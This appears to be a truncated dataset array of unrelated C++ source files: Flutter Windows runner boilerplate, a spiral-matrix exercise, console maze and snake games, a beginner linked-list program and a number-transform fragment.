0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f,\n//\t0.f, 0.f, 0.f, 0.f, 0.f, 6.497f, 0.f, 0.f, 1.624f, 0.f, 0.f, 0.f, 0.f, 0.f, 1.624f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 6.497f, 0.f, 0.f, 0.f, 0.f, 0.f,\n//\t0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f,\n//\t0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f,\n//\t0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 1.624f, 1.624f, 42.229f, 42.229f, 102.325f, 102.325f, 139.682f, 139.682f, 159.172f, 159.172f, 155.924f, 155.924f, 134.809f, 134.809f, 108.822f, 108.822f, 79.586f, 79.586f, 48.726f, 48.726f,\n//\t0.f, 6.497f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 1.624f, 1.624f, 42.229f, 42.229f, 102.325f, 102.325f, 139.682f, 139.682f, 159.172f, 159.172f, 155.924f, 155.924f, 134.809f, 134.809f, 108.822f, 108.822f, 79.586f, 79.586f, 48.726f, 48.726f,\n//\t0.f, 0.f, 1.624f, 0.f, 0.f, 0.f, 4.873f, 4.873f, 84.459f, 84.459f, 190.032f, 190.032f, 255.f, 255.f, 245.255f, 245.255f, 222.516f, 222.516f, 191.656f, 191.656f, 159.172f, 159.172f, 134.809f, 134.809f, 113.694f, 113.694f, 92.58f, 92.58f, 73.089f, 73.089f, 51.975f, 51.975f,\n//\t0.f, 0.f, 0.f, 0.f, 0.f, 0.f, 4.873f, 4.873f, 84.459f, 84.459f, 190.032f, 190.032f, 255.f, 255.f, 245.255f, 245.255f, 222.516f, 222.516f, 191.656f, 191.656f, 159.172f, 159.172f",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  unsigned int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include<iostream>\n#include<vector>\nusing namespace std;\n\n    vector<int> spiralOrder(vector<vector<int> > matrix) {\n        \n        \n        vector<int> ans;\n        int row = matrix.size();\n        int col = matrix[0].size();\n        \n        int count = 0;\n        int total = row*col;\n        \n        //index initialisation\n        int startingRow = 0;\n        int startingCol = 0;\n        int endingRow = row-1;\n        int endingCol = col-1;\n        \n        \n        while(count < total) {\n            \n            //print starting row\n            for(int index = startingCol; count < total && index<=endingCol; index++) {\n                ans.push_back(matrix[startingRow][index]);\n                count++;\n                cout<<matrix[startingRow][index]<<\" \";\n            }\n            startingRow++;\n            \n            //print ending column\n            for(int index = startingRow; count < total && index<=endingRow; index++) {\n                ans.push_back(matrix[index][endingCol]);\n                count++;\n                cout<<matrix[index][endingCol]<<\" \";\n            }\n            endingCol--;\n            \n            //print ending row\n            for(int index = endingCol; count < total && index>=startingCol; index--) {\n                ans.push_back(matrix[endingRow][index]);\n                count++;\n                cout<<matrix[endingRow][index]<<\" \";\n            }\n            endingRow--;\n            \n            //print starting column\n            for(int index = endingRow; count < total && index>=startingRow; index--) {\n                ans.push_back(matrix[index][startingCol]);\n                count++;\n                cout<<matrix[index][startingCol]<<\" \";\n            }\n            startingCol++;\n        } \n        return ans;\n    }\n\nint main(){\n    vector<vector<int> > arr={\n    {1,2,3},\n    {4,5,6},\n    {7,8,9}};\n    spiralOrder(arr);\n}",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr);\n  std::string utf8_string;\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, utf8_string.data(),\n      target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <iostream>\n#include<Windows.h>\n#include<time.h>\n#include<conio.h>\n#include<stdio.h>\n#include<stdlib.h>\n#include<string.h>\nusing namespace std;\nbool gameOver;\nconst int width = 60, hight = 30;//\u00e7\u00ec\u00b3\u00ed\u00ed\u00b3 \u00e4\u00eb\u00ff \u00b3\u00e3\u00f0\u00ee\u00e2\u00ee\u00e3\u00ee \u00ef\u00ee\u00eb\u00ff\nint x, y, score;\nenum eDirection { STOP = 0, LEFT, RIGHT, UP, DOWN, EXITT };\neDirection dir;\nchar arr[hight][width] = {};\nbool exit_t = false;\n\nint coin_1_x = 4;\nint coin_1_y = 7;\nbool coin_1 = true;\n\nint coin_2_x = 56;\nint coin_2_y = 3;\nbool coin_2 = true;\n\n\n\nint coin_3_x = 8;\nint coin_3_y = 24;\nbool coin_3 = true;\n\nint coin_4_x = 50;\nint coin_4_y = 27;\nbool coin_4 = true;\n\nint exit_1_y = 29;\nint exit_1_x = 57;\n\nint exit_2_y = 29;\nint exit_2_x = 58;\n\nint exit_3_y = 29;\nint exit_3_x = 56;\n\nint exit_4_y = 29;\nint exit_4_x = 55;\n\nvoid Setup() {\n    gameOver = false;\n    x = 1;\n    y = 1;\n    score = 0;\n\n    coin_1 = true;\n\n}\nvoid Draw() {\n    for (int i = 0; i < hight; i++) {\n        for (int j = 0; j < width; j++) {\n            if (i == 3 && j == 1 ||\n                i == 3 && j == 2 ||\n                i == 3 && j == 3 ||\n                i == 3 && j == 4 ||\n                i == 3 && j == 5 ||\n                i == 3 && j == 6 ||\n                i == 3 && j == 7 ||\n                i == 3 && j == 8 ||\n                i == 3 && j == 9 ||\n                i == 3 && j == 10 ||\n                i == 3 && j == 11 ||\n                i == 3 && j == 12 ||\n                i == 3 && j == 13 ||\n                i == 3 && j == 14 ||\n                i == 3 && j == 15 ||\n                i == 3 && j == 16 ||\n\n                i == 5 && j == 1 ||\n                i == 5 && j == 2 ||\n                i == 5 && j == 3 ||\n                i == 5 && j == 4 ||\n                i == 5 && j == 5 ||\n                i == 5 && j == 6 ||\n                i == 5 && j == 7 ||\n                i == 5 && j == 8 ||\n                i == 5 && j == 9 ||\n\n\n                i == 6 && j == 9 ||\n                i == 7 && j == 9 ||\n                i == 8 && j == 9 ||\n\n                i == 8 && j == 9 ||\n                i == 8 && j == 10 ||\n                i == 8 && j == 11 ||\n                i == 8 && j == 12 ||\n                i == 8 && j == 13 ||\n                i == 8 && j == 14 ||\n                i == 8 && j == 15 ||\n                i == 8 && j == 16 ||\n                i == 8 && j == 17 ||\n                i == 8 && j == 18 ||\n                i == 8 && j == 19 ||\n                i == 8 && j == 20 ||\n                i == 8 && j == 21 ||\n\n\n\n                i == 1 && j == 21 ||\n                i == 2 && j == 21 ||\n                i == 3 && j == 21 ||\n                i == 4 && j == 21 ||\n                i == 5 && j == 21 ||\n                i == 6 && j == 21 ||\n\n                i == 1 && j == 30 ||\n                i == 2 && j == 30 ||\n                i == 3 && j == 30 ||\n                i == 4 && j == 30 ||\n                i == 5 && j == 30 ||\n                i == 6 && j == 30 ||\n\n\n                i == 6 && j == 22 ||\n                i == 6 && j == 23 ||\n                i == 6 && j == 24 ||\n                i == 6 && j == 25 ||\n                i == 6 && j == 26 ||\n                i == 6 && j == 27 ||\n                i == 6 && j == 28 ||\n                i == 6 && j == 29 ||\n\n                i == 7 && j == 26 ||\n                i == 8 && j == 26 ||\n                i == 9 && j == 26 ||\n                i == 10 && j == 26 ||\n                i == 11 && j == 26 ||\n                i == 12 && j == 26 ||\n                i == 13 && j == 26 ||\n\n\n                i == 4 && j == 16 ||\n                i == 5 && j == 16 ||\n                i == 6 && j == 16 ||\n                i == 7 && j == 16 ||\n\n                i == 13 && j == 26 ||\n                i == 13 && j == 27 ||\n                i == 13 && j == 28 ||\n                i == 13 && j == 29 ||\n                i == 13 && j == 30 ||\n\n\n                i == 11 && j == 30 ||\n                i == 12 && j == 30 ||\n\n\n                i == 11 && j == 31 ||\n                i == 11 && j == 32 ||\n                i == 11 && j == 33 ||\n                i == 11 && j == 34 ||\n                i == 11 && j == 35 ||\n                i == 11 && j == 36 ||\n                i == 11 && j == 37 ||\n                i == 11 && j == 38 ||\n                i == 11 && j == 39 ||\n                i == 11 && j == 40 ||\n                i == 11 && j == 41 ||\n                i == 11 && j == 42 ||\n                i == 11 && j == 43 ||\n                i == 11 && j == 44 ||\n                i == 11 && j == 45 ||\n                i == 11 && j == 46 ||\n\n                i == 9 && j == 46 ||\n                i == 10 && j == 46 ||\n\n                i == 9 && j == 45 ||\n                i == 9 && j == 44 ||\n                i == 9 && j == 43 ||\n                i == 9 && j == 42 ||\n\n                i == 4 && j == 42 ||\n                i == 5 && j == 42 ||\n                i == 6 && j == 42 ||\n                i == 7 && j == 42 ||\n                i == 8 && j == 42 ||\n\n                i == 4 && j == 38 ||\n                i == 4 && j == 39 ||\n                i == 4 &",
    "#include<iostream>\r\n#include<windows.h>\r\n#include<conio.h>\r\n#include <unordered_set>\r\nusing namespace std;\r\n\r\nint height = 25;\r\nint width = 90;\r\nint gameover = 0, counter;\r\nint lflag = 0, rflag = 0, uflag = 0, dflag = 0;\r\n\r\nclass Snake {\r\n    int x, y, fx, fy;\r\n\r\n    struct node {\r\n        int nx, ny;\r\n        struct node* next;\r\n        struct node* prev;\r\n    };\r\n\r\n    struct node* head = NULL;\r\n\r\npublic:\r\n\r\n    /* Manages the visibility of the cursor in the console.*/\r\n    void cursorvisibility(bool x) {\r\n        HANDLE out = GetStdHandle(STD_OUTPUT_HANDLE);\r\n        CONSOLE_CURSOR_INFO cursorInfo;\r\n        GetConsoleCursorInfo(out, &cursorInfo);\r\n        cursorInfo.bVisible = x;\r\n        SetConsoleCursorInfo(out, &cursorInfo);\r\n    }\r\n\r\n    /* Sets the console cursor position to the specified coordinates (x, y) using WinAPI's */\r\n    void gotoxy(int x, int y){\r\n        COORD pos = { x, y };\r\n        SetConsoleCursorPosition(GetStdHandle(STD_OUTPUT_HANDLE), pos);\r\n    }\r\n\r\n   /**[Screen Management] */\r\n\r\n    /*  Displays the game screen borders */\r\n    int setBorder(int w1,int w2,int h1,int h2){\r\n        // upper and lower wall\r\n        for (int i = w1; i <= w2; i++) {\r\n            gotoxy(i, h1);\r\n            cout << \"#\";\r\n            gotoxy(i, h2);\r\n            cout << \"#\";\r\n        }\r\n        // left and right wall\r\n        for (int i = h1; i <= h2; i++) {\r\n            gotoxy(w1, i);\r\n            cout << \"#\";\r\n            gotoxy(w2, i);\r\n            cout << \"#\";\r\n        }\r\n    }\r\n\r\n    /*  Displays the current score and ESC functionality */\r\n    void sideScreen(){\r\n        gotoxy(99, 9);\r\n        cout << \"WELCOME TO \";\r\n        gotoxy(95, 10);\r\n        cout <<\"*** SNAKE GAME ***\";\r\n        gotoxy(94, 11);\r\n        cout <<\"********************\";\r\n        gotoxy(99, 13);\r\n        cout <<\" SCORE = \" << counter * 10;\r\n        gotoxy(94, 20);\r\n        cout << \" ~ Press ESC to Pause\";\r\n    }\r\n\r\n\t/* Displays the game-over screen, the player's score */\r\n    int finalScreen(){\r\n        setBorder(width/4, width/4+width/2, height/4, height/4+height/2);\r\n\r\n        gotoxy( width/2 - 9, height/2 - 2 );\r\n        cout << \"*** GAME OVER ***\";\r\n        gotoxy( width/2 - 10, height/2 - 1 );\r\n        cout << \"*******************\";\r\n\r\n        gotoxy(width/2 - 9, height/2+2 );\r\n        cout << \" You Scored : \" << counter * 10;\r\n        cursorvisibility(false);\r\n\r\n        Sleep(15000); // Pause for 1.5 seconds before clearing the screen\r\n        system(\"cls\");\r\n    }\r\n\r\n\r\n   /**[Fruit and Snake Management] */\r\n\r\n    /* Create the Fruit */\r\n    void createFruit(){\r\n        gotoxy(fx, fy);\r\n        cout << \"@\";\r\n    }\r\n\r\n    /* Create the Snake */\r\n    void createSnake(struct node* head){\r\n        struct node* ptr = head;\r\n        int count = 0;\r\n        while (ptr != NULL) {\r\n            gotoxy(ptr->nx, ptr->ny);\r\n            if (count == 0) {\r\n                cout << \"O\"; // head\r\n            } else {\r\n                cout << \"o\"; // body\r\n            }\r\n            ptr = ptr->next;\r\n            count++;\r\n        }\r\n    }\r\n\r\n    /* Create the Snake's Body */\r\n\tvoid createBody(struct node* head, int x, int y){\r\n\t\tstruct node* ptr, * previous;\r\n\t\tptr = head;\r\n\t\tprevious = head;\r\n\r\n\t\twhile (ptr->next != NULL){\r\n\t\t\tprevious = ptr;\r\n\t\t\tptr = ptr->next;\r\n\t\t}\r\n\t\twhile (previous != head){\r\n\t\t\tptr->nx = previous->nx;\r\n\t\t\tptr->ny = previous->ny;\r\n\t\t\tprevious = previous->prev;\r\n\t\t\tptr = ptr->prev;\r\n\t\t}\r\n\t\tptr->nx = previous->nx;\r\n\t\tptr->ny = previous->ny;\r\n\t\tprevious->nx = x;\r\n\t\tprevious->ny = y;\r\n\t}\r\n\r\n    /* Remove the Snake from the Screen */\r\n    void removeSnake(struct node* head){\r\n        struct node* ptr = head;\r\n        while (ptr != NULL) {\r\n            gotoxy(ptr->nx, ptr->ny);\r\n            cout << \" \";\r\n            ptr = ptr->next;\r\n        }\r\n    }\r\n\r\n    /* Snake's Initial Position */\r\n    void setInitialPosition() {\r\n        head = new node;\r\n        // Set the initial coordinates for the snake head at the center of the game grid.\r\n        head->nx = width / 2;\r\n        head->ny = height / 2;\r\n\r\n        head->next = NULL;\r\n        head->prev = NULL;\r\n\r\n        // Set the x and y variables to the same values as the head's coordinates.\r\n        x = width / 2;\r\n        y = height / 2;\r\n    }\r\n\r\n    /* Illustrate the snake and the fruit */\r\n    void draw(){\r\n        createSnake(head);\r\n        createFruit();\r\n        cursorvisibility(false);\r\n        Sleep(70);\r\n\r\n        removeSnake(head);\r\n        cursorvisibility(true);\r\n    }\r\n\r\n   /**[Snake Movement] */\r\n\r\n    /* Resets the Movement flags to their default values.*/\r\n    void resetflag(){\r\n\t\tuflag = 0;\r\n\t\tdflag = 0;\r\n\t\tlflag = 0;\r\n\t\trflag = 0;\r\n\t}\r\n\r\n    /* Handles keyboard inputs for movement and game pause*/\r\n\tvoid snakeMove(){\r\n\t\tint h;\r\n\t\tchar ch;\r\n\t\t// If a key is pressed\r\n\t\tif (_kbhit()){\r\n\t\t\tch = _getch();   // Store the pressed key\r\n\t\t\th = ch;         // store the ascii code of the pressed key\r\n            switch (h){\r\n                case 72:\r\n                 ",
    "#include <iostream>\r\n#include <stdlib.h>\r\nusing namespace std;\r\n\r\nstruct node\r\n{\r\n    node *temp, *next, *new_node;\r\n    string name;\r\n    int age, mob_no;\r\n    long long int donation_amt;\r\n} a[10];\r\n\r\nnode *get_node()\r\n{\r\n    node *temp;\r\n    temp = new node;\r\n    temp = temp->next;\r\n    return temp;\r\n}\r\n\r\nnode *create_node()\r\n{\r\n    node *head, *temp, *new_node;\r\n    string ch;\r\n    bool flag = true;\r\n    string name1;\r\n    int age1, mob_no1;\r\n    int donation_amt1;\r\n\r\n    do\r\n    {\r\n        new_node = get_node();\r\n        cout << \"Enter the name of Donor : \";\r\n        cin >> name1;\r\n        cout << endl;\r\n\r\n        cout << \"Enter the Donor age : \";\r\n        cin >> age1;\r\n        cout << endl;\r\n\r\n        cout << \"Enter the Donor mobile number : \";\r\n        cin >> mob_no1;\r\n        cout << endl;\r\n\r\n        cout << \"Enter the Donation amount : \";\r\n        cin >> donation_amt1;\r\n        cout << endl;\r\n\r\n        if (new_node == NULL)\r\n        {\r\n            cout << \"Memory not allocated..\";\r\n        }\r\n        else\r\n        {\r\n            new_node->name = name1;\r\n            new_node->donation_amt = donation_amt1;\r\n            new_node->mob_no = mob_no1;\r\n            new_node->age = age1;\r\n        }\r\n        if (flag == true)\r\n        {\r\n            head = new_node;\r\n            temp = head;\r\n            flag = false;\r\n        }\r\n        else\r\n        {\r\n            temp = temp->next;\r\n            temp = new_node;\r\n        }\r\n        cout << \"Do you want to continue y or n\\n\";\r\n        cin >> ch;\r\n    } while (ch == \"y\");\r\n    cout << \"The singly linklist is created\\n\";\r\n    \r\n    return temp;\r\n}\r\n\r\nvoid display(node *h)\r\n{\r\n    node *temp = h;\r\n    cout << \"-----------------------------------------------------\\n\";\r\n    cout << \"Name\\tAge\\tMobile_no\\tDonation_amount\\n\";\r\n    cout << temp->name << \"\\t\" << temp->age << \"\\t\" << temp->mob_no << \"\\t\" << temp->donation_amt << \"\\n\";\r\n    cout << \"-----------------------------------------------------\\n\";\r\n}\r\n\r\nint main()\r\n{\r\n    node *temp;\r\n    temp = create_node();\r\n    display(temp);\r\n\r\n    return 0;\r\n}",
    "#include <transform.h>\n#include <visit.h>\n\nstd::string Generate114::Transform(long long num, bool debug)\n{\n    // init\n    std::string out;\n    std::string result = \"\";\n    short flag = 0;\n    long long temp = num, count = 0;\n\n    // deal with negative numbers\n    if (num < 0)\n        goto NEGATIVE_NUMBER_SOLUTION;\n\n    // visit in table\n    out = Generate114::Visit(num);\n\n    // check and recreate result\n    if (out != \"\")\n    {\n        return out;\n    }\n    else\n    {\n    // deal with negative numbers\n    NEGATIVE_NUMBER_SOLUTION:\n        if (num < 0)\n        {\n            num = -num;\n            result = \"(\" + Generate114::Visit(-1) + \") * (\";\n            out = Generate114::Visit(num);\n            if (out == \"\")\n            {\n                flag = 1;\n                goto RECREATE_RESULT;\n            }\n            result += out + \")\";\n            return result;\n        }\n\n    RECREATE_RESULT:;\n        std::string out2;\n        std::string out3;\n\n        // 1. 0 <= num <= 10000(1e4)\n        if (num <= 10000)\n        {\n        FIRST_FORM_SOLUTION:\n            // form: a + b\n            for (int a = num / 2; a < num; a++)\n            